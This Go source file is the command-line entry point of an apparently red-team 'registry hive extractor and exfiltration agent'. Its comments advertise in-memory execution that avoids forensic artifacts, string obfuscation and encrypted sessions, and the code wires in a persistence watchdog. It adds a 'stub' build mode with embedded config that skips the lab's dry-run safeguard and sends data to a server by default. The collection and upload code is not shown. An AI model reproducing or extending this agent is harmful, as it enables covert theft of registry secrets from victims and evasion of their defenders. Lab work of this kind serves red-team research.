// Package main provides the CLI entry point for the ADVERSE registry hive
// extractor and exfiltration agent.
//
// Lab build: dry-run by default, synthetic data, signed kill enforced.
// Hardening: in-memory only (no MFT/USN/Prefetch/AmCache artifacts),
// per-session ChaCha20-Poly1305, XOR-string obfuscation, SecureZero hygiene,
// signed kill-switch.
//
// Two config sources:
//   - Lab build: --config is required; --dry-run defaults to true.
//   - Stub build (adversed gen-stub): config is baked in via -ldflags -X and
//     --config is optional; --dry-run defaults to false.
//
// Exit codes: 0=kill, 2=kill_switch, 1=fatal.
package main

import (
	"context"
	"errors"
	"flag"
	"fmt"
	"log"
	"os"

	"github.com/ashwnn/adverse-go/internal/agent"
	"github.com/ashwnn/adverse-go/internal/persist"
)

var (
	version   = "dev"
	buildTime = "unknown"
	gitCommit = "unknown"
)

// errConfigRequired reports that no config source was available: no embedded
// stub config and no --config flag.
var errConfigRequired = errors.New("--config is required")

// resolveAgentOptions selects the config source and the effective dry-run
// value. It is pure apart from the injected loader, making the resolution
// rules unit-testable.
//
// An embedded config (stub build) wins over --config: the stub is
// self-contained and must not depend on a file shipped to the target. Lab
// builds embed no config, so --config is required there.
//
// Dry-run defaults to true in lab mode (fail-safe: no egress) and false in
// stub mode (the stub targets a specific server) unless the operator
// explicitly passed --dry-run.
func resolveAgentOptions(embedded *agent.Config, loader func(string) (*agent.Config, error), configPath string, dryRunSet, dryRunValue bool) (*agent.Config, bool, error) {
	stub := embedded != nil
	cfg := embedded
	if cfg == nil {
		if configPath == "" {
			return nil, false, errConfigRequired
		}
		loaded, err := loader(configPath)
		if err != nil {
			return nil, false, err
		}
		cfg = loaded
	}
	dryRun := dryRunValue
	if !dryRunSet {
		dryRun = !stub
	}
	return cfg, dryRun, nil
}

// resolveFromFlagSet reads --config and --dry-run from fs and resolves them.
// Explicit detection of --dry-run uses fs.Visit, so a false value supplied on
// the command line is distinguishable from the default.
func resolveFromFlagSet(fs *flag.FlagSet, embedded *agent.Config, loader func(string) (*agent.Config, error)) (*agent.Config, bool, error) {
	configPath := fs.Lookup("config").Value.String()
	dryRunValue := fs.Lookup("dry-run").Value.String() == "true"
	dryRunSet := false
	fs.Visit(func(f *flag.Flag) {
		if f.Name == "dry-run" {
			dryRunSet = true
		}
	})
	return resolveAgentOptions(embedded, loader, configPath, dryRunSet, dryRunValue)
}

func main() {
	// Watchdog child first: a relaunch invocation is a control process and must
	// never fall through to flag parsing or config loading. When handled, this
	// call never returns for a real watchdog child (it exits with the child's
	// code); a malformed invocation reports handled=true with a fatal code.
	if handled, code := persist.MaybeRunWatchdogChild(); handled {
		os.Exit(code)
	}

	// Resolve the embedded config first so the --dry-run help text reflects
	// the mode-specific default before parsing.
	embeddedCfg, err := agent.EmbeddedConfig()
	if err != nil {
		log.Fatalf("Invalid embedded config: %v", err)
	}
	stub := embeddedCfg != nil

	fs := flag.NewFlagSet("registryfil", flag.ExitOnError)
	configFile := fs.String("config", "", "Path to configuration file (required unless a config is embedded in a stub build)")
	fs.Bool("dry-run", !stub, "Dry-run mode (no network egress); default true in lab mode, false for embedded stubs")
	verbose := fs.Bool("verbose", false, "Enable verbose logging")
	showVersion := fs.Bool("version", false, "Show version information")
	fs.Bool("resume", false, "Internal: accepted when relaunched by the persistence watchdog")
	fs.Parse(os.Args[1:])

	if *showVersion {
		fmt.Printf("registryfil %s (built %s, commit %s)\n", version, buildTime, gitCommit)
		fmt.Println("Lab build: synthetic data, signed kill enforced")
		fmt.Println("Scope: avoids user-mode hooks only. Kernel telemetry, ETW-TI, Sysmon, and MDE remain active.")
		os.Exit(0)
	}

	cfg, effectiveDryRun, err := resolveFromFlagSet(fs, embeddedCfg, agent.LoadConfig)
	if err != nil {
		if errors.Is(err, errConfigRequired) {
			fmt.Fprintln(os.Stderr, "Error: --config is required")
			fs.Usage()
			os.Exit(1)
		}
		log.Fatalf("Failed to load config: %v", err)
	}

	if err := cfg.Validate(); err != nil {
		log.Fatalf("Invalid configuration: %v", err)
	}

	logger := log.New(os.Stderr, "[registryfil] ", log.LstdFlags)
	if *verbose {
		if stub {
			logger.Printf("Config source: embedded stub")
		} else {
			logger.Printf("Config source: %s", *configFile)
		}
		logger.Printf("Hives: %v", cfg.Hives)
		logger.Printf("Server: %s", cfg.ServerURL)
		logger.Printf("Chunk size: %d", cfg.ChunkSize)
		logger.Printf("Dry-run: %v", effectiveDryRun)
	}

	a, err := agent.New(cfg, logger, effectiveDryRun, *verbose)
	if err != nil {
		log.Fatalf("Failed to create agent: %v", err)
	}

	ctx := context.Background()
	exitCode := a.Run(ctx)
	os.Exit(exitCode)
}
